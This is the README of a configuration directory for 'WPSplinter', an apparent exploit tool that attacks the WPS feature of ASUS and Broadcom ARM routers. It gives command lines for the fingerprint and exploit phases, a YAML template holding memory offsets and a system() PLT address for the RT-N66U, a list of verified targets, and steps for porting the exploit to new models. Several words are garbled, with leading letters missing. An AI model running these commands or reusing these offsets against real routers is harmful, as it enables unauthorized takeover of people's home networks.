# WPSplinter Target Configurations

This directory contains target-specific configuration files for the WPSplinter exploit.

## Usage

`ash
# Auto-detect and use appropriate config
python3 wpsplinter.py --iface wlan0 --bssid AA:BB:CC:DD:EE:FF --ssid "Test" --phase fingerprint

# Use specific config
python3 wpsplinter.py --config configs/asus_rt-n66u.yaml --phase exploit_arm

# Override PLT address
python3 wpsplinter.py --config configs/generic_broadcom_arm.yaml --system_plt 0x27683
`

## Configuration Files

| File | Target | Architecture | Verified |
|------|--------|--------------|----------|
| sus_rt-n66u.yaml | ASUS RT-N66U (Merlin) | ARM (BCM5354) | ? Yes |
| generic_broadcom_arm.yaml | Generic Broadcom ARM | ARM (BCM*) | ?? Fallback |

## Configuration Structure

`yaml
manufacturer: "ASUS"
model: "RT-N66U"
firmware: "Merlin 3.004.478"
architecture: "arm"
cpu: "BCM5354"
endianness: "little"
exploit_method: "send_data_overwrite"
verified: true

offsets:
  frags_received: 0x0000
  total_bytes_to_recv: 0x0800
  # ... more offsets

plt_addresses:
  system: 0x27683

timing:
  calibrate_delay: 0.3
  frag_ack_timeout: 3.0
  resend_timer: 5.0

notes:
  - "Source code verified"
`

## Adding New Targets

1. Analyze firmware with irmware_analyzer.py
2. Extract PLT/GOT addresses using Ghidra or 
m
3. Create new YAML file with extracted values
4. Test with phase_calibrate
5. Set erified: true after successful exploitation

## Known Working Targets

- **ASUS RT-N66U** (Merlin firmware) - Fully verified
- **ASUS DSL-AC68U** - Same chipset, likely compatible

## TODO

- [ ] Add MIPS/Ralink configurations
- [ ] Add NETGEAR D6200 config
- [ ] Add TP-Link Archer D5 config
- [ ] Implement auto-detection based on WPS fingerprint
